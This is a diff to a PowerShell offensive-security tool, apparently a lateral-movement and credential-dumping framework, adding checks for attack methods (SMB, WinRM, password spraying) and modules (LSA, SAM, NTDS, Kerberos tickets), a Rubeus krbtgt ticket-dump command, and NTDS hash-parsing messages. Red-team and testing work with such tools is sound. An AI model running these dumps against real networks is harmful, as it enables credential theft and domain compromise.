@@ -118,6 +118,54 @@ if (-not $Targets -and $Method -ne "Spray") {
 ####################################### Some logic based checking ##############################################
 ################################################################################################################
 
+
+if ($Method -ne "") {
+    switch ($Method) {
+        "WinRM" {}
+        "MSSQL" {}
+        "SMB" {}
+        "WMI" {}
+        "RDP" {}
+        "GenRelayList" {}
+        "SessionHunter" {}
+        "Spray" {}
+        "VNC" {}
+
+        default {
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Invalid Method specified"
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+            return
+        }
+    }
+}
+
+if ($Module -ne "") {
+    switch ($Module) {
+        "ConsoleHistory" {}
+        "Files" {}
+        "KerbDump" {}
+        "eKeys" {}
+        "LogonPasswords" {}
+        "LSA" {}
+        "NTDS" {}
+        "SAM" {}
+        "Tickets" {}
+
+        default {
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Invalid Module specified"
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Tickets"
+            return
+        }
+    }
+}
+
+
+
+
 if ($Threads -lt 2){
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Threads value should not be less than 2"
@@ -439,16 +487,18 @@ if (!$CurrentUser) {
                         if ($OriginalUserTicket -notlike "doI*") {
                             Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                             Write-Host "Unable to retrieve any Kerberos tickets"
+                            Write-Host "1"
                             return
                         }
                     }
                     elseif ($CheckAdmin) {
-                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
+                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /username:$env:username /nowrap" | Out-String
                         $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
 
                         if ($OriginalUserTicket -notlike "doI*") {
                             Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                             Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
+                            Write-Host "2"
                             return
                         }
                     }
@@ -456,6 +506,7 @@ if (!$CurrentUser) {
                 catch {
                     Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                     Write-Host "Unable to retrieve any Kerberos tickets"
+                    Write-Host "3"
                     return
                 }
             }
@@ -5204,6 +5255,9 @@ Function Parse-NTDS {
         [string]$DirectoryPath
     )
 
+        Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
+        Start-sleep -Seconds "2"
+
     if ([string]::IsNullOrEmpty($DirectoryPath)) {
         Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
         return
@@ -5285,6 +5339,10 @@ Function Parse-NTDS {
         # Write SAM hashes to SAMHashes.txt
         $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
     }
+
+    Write-Output ""
+    Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-host "Parsed NTDS files stored in $newDirectoryPath"
 }
 
 
@@ -5307,10 +5365,10 @@ switch ($Method) {
         "VNC" {Method-VNC}
         
         default {
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Invalid Method specified"
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specify either WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
         return
       
       }
